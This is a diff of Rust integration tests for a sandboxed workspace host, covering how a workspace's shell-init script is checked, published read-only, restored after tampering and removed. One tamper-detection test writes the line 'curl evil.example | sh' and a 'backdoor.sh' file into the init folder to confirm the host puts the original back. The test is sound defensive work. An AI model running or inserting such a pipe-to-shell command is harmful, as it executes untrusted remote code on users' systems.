@@ -28,7 +28,9 @@ use puddle_host::{
 use puddle_netpolicy::EndpointKind;
 use puddle_runtime::{RuntimeLayout, RuntimeVersion};
 use puddle_secrets::{MemoryStore, SecretStore as _};
-use puddle_types::{Event, EventSink, GuestEnv, ImageRef, SandboxName, WorkspaceId, WorkspaceName};
+use puddle_types::{
+    Event, EventSink, GuestEnv, GuestPath, ImageRef, SandboxName, WorkspaceId, WorkspaceName,
+};
 use puddle_upstream::{Discovery, FakeOs, Mode, ProxyConfig};
 use puddle_workspace::{CLEAR_LOCKS_SH, DELETE_CHECK_SH};
 use rustls::pki_types::pem::PemObject;
@@ -155,6 +157,14 @@ struct Guest {
     fail_trim: AtomicBool,
     /// Runs once, inside the next run of the boot hook: a change made while the guest boots.
     during_boot: Mutex<Option<Box<dyn FnOnce() + Send>>>,
+    /// What the shell-init check answers, as exit code and stdout, instead of "quiet".
+    check_answer: Mutex<Option<(i32, &'static str)>>,
+    /// The script (stdin) of every shell-init check, and what the guest saw at the mounted file
+    /// while it ran.
+    checks: Mutex<Vec<(String, Option<String>)>>,
+    /// Lines the next boot hook prints after its own, once: what the hook says about a file it
+    /// put back.
+    boot_says: Mutex<String>,
     /// When set, the clone turns this path into a folder, so the next save of the workspace
     /// list fails (a stand-in for a full disk or a locked file).
     break_list_on_clone: Mutex<Option<PathBuf>>,
@@ -174,6 +184,7 @@ impl Guest {
             ("sh", _) if second == Some(CLEAR_LOCKS_SH) => "locks",
             ("sh", _) if second == Some(DELETE_CHECK_SH) => "check",
             ("sh", _) if second.is_some_and(|s| s.contains("fstrim")) => "shutdown-trim",
+            ("sh", _) if second.is_some_and(|s| s.contains("mktemp")) => "shell-init-check",
             ("fstrim", _) => "trim",
             ("git", _) => "clone",
             ("sync", _) => "sync",
@@ -197,9 +208,21 @@ impl Guest {
             "boot" if self.during_boot.lock().unwrap().is_some() => {
                 let change = self.during_boot.lock().unwrap().take().unwrap();
                 change();
-                ExecOutput::new(0, "puddle-boot: ready\n", "")
+                self.boot_ok()
             }
-            "boot" => ExecOutput::new(0, "puddle-boot: ready\n", ""),
+            "boot" => self.boot_ok(),
+            "shell-init-check" => {
+                let seen = ctx
+                    .read(&GuestPath::new("/puddle/shell-init/init.sh").unwrap())
+                    .ok()
+                    .map(|bytes| String::from_utf8_lossy(&bytes).into_owned());
+                let script = String::from_utf8_lossy(&r.stdin).into_owned();
+                self.checks.lock().unwrap().push((script, seen));
+                match *self.check_answer.lock().unwrap() {
+                    Some((code, out)) => ExecOutput::new(code, out, ""),
+                    None => ExecOutput::new(0, "", ""),
+                }
+            }
             "layout" if self.fail_layout.load(Ordering::SeqCst) => ExecOutput::new(
                 1,
                 "",
@@ -231,6 +254,11 @@ impl Guest {
             }
             _ => ExecOutput::new(0, "", ""),
         })
+    }
+
+    fn boot_ok(&self) -> ExecOutput {
+        let said = std::mem::take(&mut *self.boot_says.lock().unwrap());
+        ExecOutput::new(0, format!("{said}puddle-boot: ready\n"), "")
     }
 
     fn commands(&self) -> Vec<String> {
@@ -3526,6 +3554,7 @@ async fn a_workspace_starts_with_its_variables_and_a_stand_in_for_each_secret_an
     );
 }
 
+#[expect(clippy::too_many_lines, reason = "one story, read top to bottom")]
 #[tokio::test(flavor = "multi_thread")]
 async fn a_secret_added_to_a_running_workspace_is_decrypted_from_the_next_connection_with_no_restart()
  {
@@ -3543,7 +3572,12 @@ async fn a_secret_added_to_a_running_workspace_is_decrypted_from_the_next_connec
         .certificate()
         .clone();
     let registry_before = host.workspaces().termination(&name("acme")).unwrap();
-    let boots = rig.guest.boots();
+    let beta_commands = rig
+        .guest
+        .commands()
+        .iter()
+        .filter(|c| c.starts_with("beta "))
+        .count();
     let (creates, starts, stops) = (
         calls_of(&rig, "Create"),
         calls_of(&rig, "Start"),
@@ -3568,9 +3602,19 @@ async fn a_secret_added_to_a_running_workspace_is_decrypted_from_the_next_connec
     // the new stand-in too.
     assert_eq!(after.ca().certificate(), &ca_before);
     assert!(Arc::ptr_eq(registry_before.stand_ins(), after.stand_ins()));
-    // Only that workspace, and nothing was started, stopped or booted again.
+    // Only that workspace, and nothing was started or stopped. (The login-shell file is rewritten
+    // for a change to the variables, which runs the boot plan again in that guest alone; the next
+    // test is about that.)
     assert!(!decrypts(&host, "beta", "api.example.org"));
-    assert_eq!(rig.guest.boots(), boots);
+    assert_eq!(
+        rig.guest
+            .commands()
+            .iter()
+            .filter(|c| c.starts_with("beta "))
+            .count(),
+        beta_commands,
+        "beta's guest was not touched"
+    );
     assert_eq!(
         (
             calls_of(&rig, "Create"),
@@ -4540,4 +4584,558 @@ async fn a_credential_store_that_cannot_be_read_at_start_is_a_problem_until_the_
         again.problems().list()
     );
     again.shutdown().await;
+}
+
+// ---- shell init -------------------------------------------------------------------------------
+
+/// The folder the guest sees a workspace's shell init in, on the host.
+fn shell_init_folder(rig: &Rig, workspace: &str) -> PathBuf {
+    rig.dir
+        .path()
+        .join("data")
+        .join("guest-share")
+        .join("shell-init")
+        .join(workspace)
+}
+
+async fn put_shell_init(api: &Api, workspace: &str, content: &str) -> support::Reply {
+    api.put(
+        &format!("/api/workspaces/{workspace}/shell-init"),
+        &json!({ "content": content }).to_string(),
+    )
+    .await
+}
+
+fn is_event(kind: &'static str, workspace: &'static str) -> impl Fn(&serde_json::Value) -> bool {
+    move |e| e["type"] == kind && e["workspace"] == workspace
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_saved_shell_init_reaches_a_running_workspace_read_only_and_through_a_file_puddle_owns() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+
+    // Nothing saved yet: the folder is there and empty, and the login shells load it all the same.
+    assert_eq!(
+        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).unwrap(),
+        ""
+    );
+    let files = rig.guest.plan_files(rig.guest.boots() - 1);
+    let loader = pem_of(&files, "/etc/profile.d/02-puddle-shell-init.sh");
+    assert!(loader.contains(". /puddle/shell-init/init.sh"), "{loader}");
+    let read = api.get("/api/workspaces/acme/shell-init").await;
+    assert_eq!(read.status, 200, "{}", read.body);
+    assert_eq!(read.json()["saved"], false);
+    assert_eq!(read.json()["content"], "");
+
+    // A save in a running workspace is checked in the guest, then published at once.
+    let saved = put_shell_init(&api, "acme", "export EDITOR=vim\r\n").await;
+    assert_eq!(saved.status, 200, "{}", saved.body);
+    assert_eq!(saved.json()["checked"], true);
+    assert_eq!(saved.json()["shell_init"]["content"], "export EDITOR=vim\n");
+    events
+        .until(
+            is_event("workspace_shell_init_changed", "acme"),
+            Duration::from_secs(20),
+        )
+        .await;
+    eventually("the folder holds the saved text", || {
+        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
+            == Some("export EDITOR=vim\n".to_owned())
+    })
+    .await;
+    assert_eq!(
+        rig.guest.checks.lock().unwrap()[0].0,
+        "export EDITOR=vim\n",
+        "the guest was handed the script to check"
+    );
+    // The change reached the guest without booting it again.
+    assert_eq!(rig.guest.boots(), 1);
+
+    // Removing it empties the file again; removing what is not there is a 404.
+    assert_eq!(
+        api.delete("/api/workspaces/acme/shell-init", None)
+            .await
+            .status,
+        204
+    );
+    eventually("the folder is empty again", || {
+        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
+            == Some(String::new())
+    })
+    .await;
+    assert_eq!(
+        api.delete("/api/workspaces/acme/shell-init", None)
+            .await
+            .status,
+        404
+    );
+    assert_eq!(
+        api.get("/api/workspaces/nobody/shell-init").await.status,
+        404
+    );
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_script_that_prints_or_does_not_parse_is_refused_with_what_was_seen_and_nothing_is_saved()
+{
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+
+    *rig.guest.check_answer.lock().unwrap() = Some((66, "hello from my init\n"));
+    let loud = put_shell_init(&api, "acme", "echo hello from my init").await;
+    assert_eq!(loud.status, 422, "{}", loud.body);
+    assert!(
+        loud.body.contains("It printed: hello from my init"),
+        "{}",
+        loud.body
+    );
+    *rig.guest.check_answer.lock().unwrap() = Some((65, "line 1: syntax error"));
+    let broken = put_shell_init(&api, "acme", "if then").await;
+    assert_eq!(broken.status, 422, "{}", broken.body);
+    assert!(broken.body.contains("does not parse"), "{}", broken.body);
+    assert_eq!(
+        api.get("/api/workspaces/acme/shell-init").await.json()["saved"],
+        false
+    );
+
+    // Text the store refuses never reaches the guest.
+    let before = rig.guest.checks.lock().unwrap().len();
+    for refused in ["", "  \n", "a\u{0}b"] {
+        assert_eq!(put_shell_init(&api, "acme", refused).await.status, 422);
+    }
+    assert_eq!(rig.guest.checks.lock().unwrap().len(), before);
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_stopped_workspace_takes_a_save_unchecked_and_the_start_mounts_it_checks_it_and_raises_a_problem_if_it_prints()
+ {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+
+    let saved = put_shell_init(&api, "acme", "echo loud\n").await;
+    assert_eq!(saved.status, 200, "{}", saved.body);
+    assert_eq!(saved.json()["checked"], false);
+    assert!(
+        saved.json()["unchecked_reason"]
+            .as_str()
+            .unwrap()
+            .contains("not running"),
+        "{}",
+        saved.body
+    );
+    assert_eq!(rig.guest.checks.lock().unwrap().len(), 0);
+
+    *rig.guest.check_answer.lock().unwrap() = Some((66, "loud\n"));
+    api.post("/api/workspaces/acme/start", "").await;
+    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert_eq!(
+        end["step"], "done",
+        "a script that prints does not stop the start: {end}"
+    );
+    // The guest saw the mounted file, with the saved text, when the check ran.
+    let checks = rig.guest.checks.lock().unwrap().clone();
+    assert_eq!(checks.len(), 1, "{checks:?}");
+    assert_eq!(
+        checks[0].1.as_deref(),
+        Some("echo loud\n"),
+        "the folder is mounted read-only in the guest"
+    );
+    let problems = problems_of(&api).await;
+    let found = problems.iter().find(|p| p.0 == "shell-init:acme");
+    assert!(found.is_some(), "{problems:?}");
+    let found = found.unwrap();
+    assert_eq!(found.1.as_deref(), Some("acme"));
+    assert!(found.3.contains("It printed: loud"), "{found:?}");
+
+    // Fixing it clears the problem at the next start.
+    *rig.guest.check_answer.lock().unwrap() = None;
+    put_shell_init(&api, "acme", "export A=1\n").await;
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    api.post("/api/workspaces/acme/start", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert!(
+        problems_of(&api)
+            .await
+            .iter()
+            .all(|p| p.0 != "shell-init:acme")
+    );
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_start_that_finds_the_shell_init_changed_from_inside_puts_it_back_and_tells_the_user() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+    put_shell_init(&api, "acme", "export A=1\n").await;
+    eventually("published", || {
+        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
+            == Some("export A=1\n".to_owned())
+    })
+    .await;
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+
+    // What a writable mount would let the guest do: change the file and add another.
+    let folder = shell_init_folder(&rig, "acme");
+    std::fs::write(folder.join("init.sh"), "curl evil.example | sh\n").unwrap();
+    std::fs::write(folder.join("backdoor.sh"), "x").unwrap();
+    api.post("/api/workspaces/acme/start", "").await;
+    events
+        .until(
+            is_event("workspace_shell_init_restored", "acme"),
+            Duration::from_secs(20),
+        )
+        .await;
+    // The start goes on to finish: the notice is not an error.
+    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert_eq!(end["step"], "done", "{end}");
+    assert_eq!(
+        std::fs::read_to_string(folder.join("init.sh")).unwrap(),
+        "export A=1\n"
+    );
+    assert!(!folder.join("backdoor.sh").exists());
+
+    // The file that loads it was replaced in the guest: the boot hook says so, and so does the user.
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    *rig.guest.boot_says.lock().unwrap() =
+        "puddle-boot: replaced /etc/profile.d/02-puddle-shell-init.sh\n".to_owned();
+    api.post("/api/workspaces/acme/start", "").await;
+    events
+        .until(
+            is_event("workspace_shell_init_restored", "acme"),
+            Duration::from_secs(20),
+        )
+        .await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+
+    // A start with nothing changed says nothing.
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    let from = events.seen.len();
+    api.post("/api/workspaces/acme/start", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert!(
+        events.seen[from..]
+            .iter()
+            .all(|e| e["type"] != "workspace_shell_init_restored"),
+        "{:?}",
+        &events.seen[from..]
+    );
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn deleting_a_workspace_removes_its_shell_init_and_the_folder() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+    put_shell_init(&api, "acme", "export A=1\n").await;
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert!(shell_init_folder(&rig, "acme").exists());
+    let reply = api
+        .delete(
+            "/api/workspaces/acme",
+            Some(&json!({"confirm": true}).to_string()),
+        )
+        .await;
+    assert_eq!(reply.status, 202, "{}", reply.body);
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert!(!shell_init_folder(&rig, "acme").exists());
+    assert_eq!(host.store().shell_init(&name("acme")).unwrap(), None);
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_changed_variable_reaches_the_login_shell_file_of_a_running_workspace_without_a_restart()
+{
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+    let boots = rig.guest.boots();
+    let (creates, starts, stops) = (
+        calls_of(&rig, "Create"),
+        calls_of(&rig, "Start"),
+        calls_of(&rig, "Stop"),
+    );
+
+    put_env(
+        &api,
+        "/api/workspaces/acme/env/EDITOR",
+        json!({"kind": "plain", "value": "vim"}),
+    )
+    .await;
+    rig.guest.boots_reach(boots + 1).await;
+    let file = pem_of(
+        &rig.guest.plan_files(rig.guest.boots() - 1),
+        "/etc/profile.d/01-puddle-env.sh",
+    );
+    assert!(file.contains("export EDITOR='vim'"), "{file}");
+
+    // A global variable reaches it too, a secret as its stand-in and never its value, and a
+    // removed one leaves the file.
+    put_env(
+        &api,
+        "/api/env/NPM_TOKEN",
+        secret_body(Some(REAL), &["registry.example.org"]),
+    )
+    .await;
+    rig.guest.boots_reach(boots + 2).await;
+    let stand_in = stand_in_of(&host, "acme", "NPM_TOKEN");
+    let file = pem_of(
+        &rig.guest.plan_files(rig.guest.boots() - 1),
+        "/etc/profile.d/01-puddle-env.sh",
+    );
+    assert!(
+        file.contains(&format!("export NPM_TOKEN='{stand_in}'")),
+        "{file}"
+    );
+    assert!(!guest_has(&rig, REAL));
+    assert_eq!(
+        api.delete("/api/workspaces/acme/env/EDITOR", None)
+            .await
+            .status,
+        204
+    );
+    rig.guest.boots_reach(boots + 3).await;
+    let file = pem_of(
+        &rig.guest.plan_files(rig.guest.boots() - 1),
+        "/etc/profile.d/01-puddle-env.sh",
+    );
+    assert!(!file.contains("EDITOR"), "{file}");
+
+    // Nothing was created, started or stopped for any of it.
+    assert_eq!(
+        (
+            calls_of(&rig, "Create"),
+            calls_of(&rig, "Start"),
+            calls_of(&rig, "Stop")
+        ),
+        (creates, starts, stops)
+    );
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_check_that_cannot_run_is_not_a_verdict_on_the_script() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+
+    // Saving: the guest could not set the check up (exit 70). The script is not blamed: the save
+    // is answered as unavailable and nothing is saved.
+    *rig.guest.check_answer.lock().unwrap() = Some((70, ""));
+    let saved = put_shell_init(&api, "acme", "export A=1\n").await;
+    assert_eq!(saved.status, 503, "{}", saved.body);
+    assert!(saved.body.contains("could not run"), "{}", saved.body);
+    assert_eq!(
+        api.get("/api/workspaces/acme/shell-init").await.json()["saved"],
+        false
+    );
+
+    // Starting: the same failure is a problem on the workspace and the start goes on.
+    *rig.guest.check_answer.lock().unwrap() = None;
+    put_shell_init(&api, "acme", "export A=1\n").await;
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    *rig.guest.check_answer.lock().unwrap() = Some((70, ""));
+    api.post("/api/workspaces/acme/start", "").await;
+    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert_eq!(end["step"], "done", "{end}");
+    let problems = problems_of(&api).await;
+    let found = problems.iter().find(|p| p.0 == "shell-init:acme");
+    assert!(found.is_some(), "{problems:?}");
+    assert!(found.unwrap().2.contains("could not check"), "{found:?}");
+    host.shutdown().await;
+}
+
+/// Waits for the problem `key` to be there (or gone) in the problem list, and says what it is.
+async fn problem_is(api: &Api, key: &str, present: bool) -> Option<(String, String)> {
+    let mut found = None;
+    for _ in 0..500 {
+        found = problems_of(api)
+            .await
+            .into_iter()
+            .find(|p| p.0 == key)
+            .map(|p| (p.2, p.3));
+        if found.is_some() == present {
+            break;
+        }
+        tokio::time::sleep(Duration::from_millis(20)).await;
+    }
+    assert_eq!(found.is_some(), present, "the problem {key}: {found:?}");
+    found
+}
+
+/// Puts a plain file where the workspace's shell init folder is (or was), so nothing can be
+/// published there.
+fn block_shell_init_folder(rig: &Rig, workspace: &str) -> PathBuf {
+    let folder = shell_init_folder(rig, workspace);
+    std::fs::remove_dir_all(&folder).unwrap();
+    std::fs::write(&folder, "in the way").unwrap();
+    folder
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_shell_init_that_cannot_reach_the_running_guest_is_a_problem_until_a_save_gets_through() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+    let folder = block_shell_init_folder(&rig, "acme");
+
+    let saved = put_shell_init(&api, "acme", "export A=1\n").await;
+    assert_eq!(saved.status, 200, "{}", saved.body);
+    let (title, detail) = problem_is(&api, "shell-init-copy:acme", true)
+        .await
+        .unwrap();
+    assert!(title.contains("acme's shell init"), "{title}");
+    assert!(detail.contains("keeps the shell init it had"), "{detail}");
+
+    std::fs::remove_file(&folder).unwrap();
+    put_shell_init(&api, "acme", "export A=2\n").await;
+    problem_is(&api, "shell-init-copy:acme", false).await;
+    assert_eq!(
+        std::fs::read_to_string(folder.join("init.sh")).unwrap(),
+        "export A=2\n"
+    );
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_start_that_cannot_write_the_shell_init_folder_fails_and_leaves_the_workspace_stopped() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+    api.post("/api/workspaces/acme/stop", "").await;
+    events.until(ended("acme"), Duration::from_secs(20)).await;
+    let folder = block_shell_init_folder(&rig, "acme");
+
+    api.post("/api/workspaces/acme/start", "").await;
+    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert_eq!(end["step"], "failed", "{end}");
+    assert!(
+        end["detail"]
+            .as_str()
+            .unwrap()
+            .contains("acme's shell init"),
+        "{end}"
+    );
+
+    std::fs::remove_file(&folder).unwrap();
+    api.post("/api/workspaces/acme/start", "").await;
+    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert_eq!(end["step"], "done", "{end}");
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_change_to_the_variables_that_the_guest_cannot_take_says_so_and_keeps_the_change() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    create(&api, &mut events, "acme").await;
+
+    rig.guest.fail_boot.store(true, Ordering::SeqCst);
+    put_env(
+        &api,
+        "/api/workspaces/acme/env/EDITOR",
+        json!({"kind": "plain", "value": "vim"}),
+    )
+    .await;
+    let failed = events
+        .until(
+            is_event("workspace_env_failed", "acme"),
+            Duration::from_secs(20),
+        )
+        .await;
+    let reason = failed["reason"].as_str().unwrap();
+    assert!(
+        reason.contains("the change is saved") && reason.contains("keep the old variables"),
+        "{failed}"
+    );
+    let saved = api.get("/api/workspaces/acme/env").await;
+    assert!(saved.body.contains("EDITOR"), "{}", saved.body);
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_create_that_cannot_write_the_shell_init_folder_fails_and_leaves_nothing_behind() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    let parent = shell_init_folder(&rig, "acme")
+        .parent()
+        .unwrap()
+        .to_path_buf();
+    std::fs::create_dir_all(parent.parent().unwrap()).unwrap();
+    let _ = std::fs::remove_dir_all(&parent);
+    std::fs::write(&parent, "in the way").unwrap();
+
+    api.post("/api/workspaces", &new_workspace("acme")).await;
+    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
+    assert_eq!(end["step"], "failed", "{end}");
+    assert!(rig.runtime.list_volumes().await.unwrap().is_empty());
+    assert!(rig.runtime.list().await.unwrap().is_empty());
+
+    std::fs::remove_file(&parent).unwrap();
+    create(&api, &mut events, "acme").await;
+    host.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_variable_set_while_the_guest_boots_reaches_its_login_shells_once_it_is_up() {
+    let rig = Rig::new();
+    let host = rig.start().await;
+    let api = api(&host);
+    let mut events = api.events().await;
+    let store = host.store().clone();
+    *rig.guest.during_boot.lock().unwrap() = Some(Box::new(move || {
+        store
+            .set_env(
+                &puddle_store::EnvScope::Workspace(name("acme")),
+                &puddle_store::EnvName::new("EDITOR").unwrap(),
+                puddle_store::EnvDraft::plain("vim").unwrap(),
+            )
+            .unwrap();
+    }));
+    create(&api, &mut events, "acme").await;
+
+    rig.guest.boots_reach(2).await;
+    let file = pem_of(
+        &rig.guest.plan_files(rig.guest.boots() - 1),
+        "/etc/profile.d/01-puddle-env.sh",
+    );
+    assert!(file.contains("export EDITOR='vim'"), "{file}");
+    host.shutdown().await;
 }
